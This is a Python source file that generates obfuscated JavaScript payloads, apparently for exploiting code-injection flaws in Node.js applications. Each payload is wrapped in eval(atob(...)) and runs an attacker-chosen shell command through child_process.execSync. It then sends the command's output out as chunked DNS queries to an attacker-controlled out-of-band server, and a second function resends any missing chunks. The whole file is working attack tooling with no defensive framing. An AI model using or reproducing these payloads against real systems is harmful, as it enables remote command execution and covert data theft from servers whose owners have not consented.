import base64

def init(oob_server, chunk_size, command):
    return 'eval(atob("' + base64.b64encode(f"""
    var dns = require('dns');
    var cp = require('child_process');
    
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; 
    
    var commandOutput = cp.execSync('{command}', {{ maxBuffer: 1048576 }}).toString().split('');
    
    var chunkSize = {chunk_size}; 
    while (commandOutput.length % chunkSize !== 0) {{
        commandOutput.push(String.fromCharCode(10)); // Append newline character
    }}
    
    var len = Math.ceil(commandOutput.length / chunkSize); 
    
    var randStr = () => 
        Array(4).fill().map(() => chars[Math.floor(Math.random() * 36)]).join('');
    
    dns.resolve(`0.${{len}}.${{randStr()}}.{oob_server}`, () => {{
        var queries = commandOutput.map(c => c.charCodeAt(0))
                                     .reduce((acc, _, i, arr) => 
                                         i % chunkSize === 0 ? 
                                         acc.concat(`${{(i / chunkSize) + 1}}.${{arr.slice(i, i + chunkSize).join('.')}}.${{randStr()}}.{oob_server}`) 
                                         : acc, []);

        function sendQueryWithDelay(index) {{
            if (index < queries.length) {{
                dns.resolve(queries[index], () => {{}});
                setTimeout(() => sendQueryWithDelay(index + 1), 10);
            }}
        }}

        sendQueryWithDelay(0);
    }});
    """.encode('utf-8')).decode('utf-8') + '"))'
    
def missing_chunks(chunk_indices, oob_server, chunk_size, command):
    return 'eval(atob("' + base64.b64encode(f"""
    var dns = require('dns');
    var cp = require('child_process');
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    
    var commandOutput = cp.execSync('{command}').toString().split('');
    var chunkSize = {chunk_size};

    while (commandOutput.length % chunkSize !== 0) {{
        commandOutput.push(String.fromCharCode(10));
    }}

    var randStr = () => Array(4).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');

    var chunks = [];
    for (let i = 0; i < commandOutput.length; i += chunkSize) {{
        chunks.push(commandOutput.slice(i, i + chunkSize));
    }}

    var givenChunkIndices = {chunk_indices};

    const queries = givenChunkIndices.map(index => {{
        if (index < chunks.length) {{
            const chunkToSend = chunks[index];
            const charCodes = chunkToSend.map(c => c.charCodeAt(0)).join('.');
            return `${{index + 1}}.${{charCodes}}.${{randStr()}}.{oob_server}`;
        }}
        return null; // Skip if the index is out of bounds
    }}).filter(query => query !== null);
    
    function sendQueryWithDelay(index) {{
        if (index < queries.length) {{
            dns.resolve(queries[index], () => {{}}); // Fire and forget DNS request
            setTimeout(() => sendQueryWithDelay(index + 1), 10); // Delay before the next request
        }}
    }}

    sendQueryWithDelay(0);
    """.encode('utf-8')).decode('utf-8') + '"))'